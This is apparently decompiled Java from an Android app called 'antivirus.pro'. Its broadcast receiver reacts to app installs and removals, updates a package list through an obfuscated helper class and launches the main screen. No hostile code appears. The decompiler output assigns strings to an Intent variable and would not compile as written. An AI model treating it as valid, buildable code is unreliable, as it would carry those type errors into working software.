package antivirus.pro;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import java.io.PrintStream;
import java.util.ArrayList;

public class MainReceiver
  extends BroadcastReceiver
{
  public static String a = "update";
  
  public MainReceiver() {}
  
  private static void a(Context paramContext, String paramString)
  {
    Intent localIntent = new Intent(paramContext, MainActivity.class);
    localIntent.addFlags(268435456);
    localIntent.addFlags(536870912);
    if (paramString != null) {
      localIntent.putExtra("new", paramString);
    }
    paramContext.startActivity(localIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Uri localUri = null;
    Object localObject = null;
    String str = paramIntent.getAction();
    try
    {
      if (str.equals("android.intent.action.PACKAGE_REMOVED"))
      {
        localUri = paramIntent.getData();
        paramIntent = (Intent)localObject;
        if (localUri != null) {
          paramIntent = localUri.getSchemeSpecificPart();
        }
        if ((paramIntent != null) && (paramIntent.length() > 2))
        {
          paramContext = new d(paramContext);
          localObject = paramContext.a();
          if (((ArrayList)localObject).contains(paramIntent))
          {
            ((ArrayList)localObject).remove(paramIntent);
            paramContext.a((ArrayList)localObject);
          }
        }
      }
      else if (str.equals("android.intent.action.PACKAGE_ADDED"))
      {
        localObject = paramIntent.getData();
        paramIntent = localUri;
        if (localObject != null) {
          paramIntent = ((Uri)localObject).getSchemeSpecificPart();
        }
        System.out.println("pkg: " + paramIntent);
        if ((paramIntent != null) && (paramIntent.length() > 2) && (d.a(paramContext, new d(paramContext).a(), paramIntent))) {
          a(paramContext, paramIntent);
        }
      }
      else if (str.equals(a))
      {
        new d(paramContext).a(d.b());
        if (!d.a(paramContext, null).isEmpty()) {
          a(paramContext, null);
        }
      }
      else
      {
        d.a(paramContext, a, d.b * 20, true);
      }
      return;
    }
    catch (Exception paramContext) {}
  }
}
